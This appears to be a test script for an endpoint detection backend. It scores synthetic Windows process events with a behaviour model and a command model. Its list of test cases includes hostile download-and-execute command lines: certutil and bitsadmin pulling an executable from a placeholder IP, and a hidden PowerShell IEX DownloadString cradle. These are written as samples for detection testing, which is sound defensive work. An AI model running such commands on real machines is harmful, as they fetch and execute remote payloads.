"""CVSS + command model wired into runtime scoring, on a behaviour model trained on endpoint 8's real events."""
import sys, os, warnings
from datetime import datetime, timedelta, timezone

warnings.filterwarnings("ignore")
from _paths import BACKEND, DATA, DATASETS  # noqa: E402  (tests/_paths.py)
sys.path.insert(0, str(BACKEND))
os.chdir(str(BACKEND))
from app.services import cvss
from app.services.ml import runtime
from app.services.ml.data import load_csv
from app.services.ml.model import BehaviorModel

rows = load_csv(str(DATASETS / "endpoint-8.csv.gz"), endpoint_id=8, user_actions_only=True)
model = BehaviorModel(requirements=cvss.requirements_for(None)).fit(rows)
cm = runtime.command_model()
print("behaviour model trained on", model.trained_on, "| command model loaded:", cm is not None, "| lock from risk", runtime.CRITICAL_RISK)

base = datetime.now(timezone.utc).replace(hour=3, minute=0, second=0, microsecond=0) - timedelta(days=1)


def proc(name, minute, cmd):
    return {
        "endpoint_id": 8, "event_time": base + timedelta(minutes=minute), "rule_level": 3, "severity": "Info",
        "event_type": "Process Created", "event_user": "u", "windows_event_id": "4688", "wazuh_alert_id": f"t-{name}-{minute}",
        "details": {"data": {"win": {"eventdata": {
            "newProcessName": "C:\\Windows\\System32\\" + name, "subjectUserName": "u",
            "parentProcessName": r"C:\Windows\explorer.exe", "commandLine": cmd}}}},
    }


cases = [
    ("copilotapp.exe", "copilotapp.exe"),
    ("whoami.exe", "whoami"),
    ("certutil.exe", r"certutil -hashfile C:\Windows\notepad.exe SHA256"),
    ("certutil.exe", r"certutil -urlcache -f http://198.51.100.7/a.exe C:\Users\Public\a.exe"),
    ("bitsadmin.exe", "bitsadmin /list"),
    ("bitsadmin.exe", r"bitsadmin /transfer j http://198.51.100.7/a.exe C:\Users\Public\a.exe"),
    ("powershell.exe", "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"),
    ("powershell.exe", "powershell -Command Get-Date"),
]
events = [proc(n, 5 * i, c) for i, (n, c) in enumerate(cases)]
runtime._score_into(model, events, history=[])
for (n, c), e in zip(cases, events):
    print(f"risk={e['risk_score']!s:>4} {e['severity']:9} {e['risk_reason'] or '(not flagged)'}")
    print(f"      for: {c[:100]}")

# without the command model: back to judging by program
runtime._command_model, runtime._command_model_tried = None, True
ev2 = [proc(n, 5 * i, c) for i, (n, c) in enumerate(cases[2:3])]
runtime._score_into(model, ev2, history=[])
print("\nwithout the command model:", ev2[0]["risk_score"], ev2[0]["severity"], ev2[0]["risk_reason"])
